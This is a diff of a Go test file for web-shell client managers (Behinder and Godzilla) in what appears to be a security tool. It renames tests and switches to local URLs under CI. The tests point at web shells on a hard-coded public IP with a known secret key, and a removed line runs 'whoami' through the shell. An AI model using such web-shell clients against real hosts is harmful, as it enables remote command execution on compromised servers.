@@ -137,9 +137,13 @@ func TestNewWebASPXShell(t *testing.T) {
 	t.Logf("%v", ping)
 }
 
-func TestNewWebPHPShell(t *testing.T) {
+func TestMUSTPASS_Behinder_PHP(t *testing.T) {
 
 	url := "http://47.120.44.219/bx4-bs64.php"
+	if utils.InGithubActions() {
+		url = "http://127.0.0.1:8086/bx4-bs64.php"
+	}
+
 	bx, _ := NewBehinderManager(url,
 		SetSecretKey("rebeyond"),
 		SetShellScript("php"),
@@ -175,13 +179,11 @@ function encrypt($data){
 	//	return
 	//}
 	//t.Logf("%v", (ping))
-	cmd, err := bx.CommandExec("whoami")
-	//ping, err := bx.listFile("C:/")
+	ping, err := bx.Ping()
 	if err != nil {
 		t.Error(err)
-		return
 	}
-	t.Logf("%v", string(cmd))
+	assert.True(t, ping)
 }
 
 func TestNewWebPHPShell_PPT(t *testing.T) {
@@ -268,7 +270,7 @@ func TestNewWebASPShell_B3(t *testing.T) {
 	t.Logf("%v", string(dir))
 }
 
-func TestNewGodzillaBase64Jsp(t *testing.T) {
+func TestMUSTPASS_Godzilla_JSP_Base64(t *testing.T) {
 	url := "http://47.120.44.219:8080/bs64.jsp"
 	if utils.InGithubActions() {
 		url = "http://127.0.0.1:8085/godzilla_bs64.jsp"
@@ -354,7 +356,7 @@ func TestNewGodzillaBase64Jsp_Plugin(t *testing.T) {
 	//fmt.Println(string(info))
 }
 
-func TestNewGodzillaBase64Aspx(t *testing.T) {
+func TestMUSTPASS_Godzilla_ASPX_Base64(t *testing.T) {
 	url := "http://47.120.44.219:8087/bs64.aspx"
 	if utils.InGithubActions() {
 		url = "http://127.0.0.1:8087/gbs64.aspx"
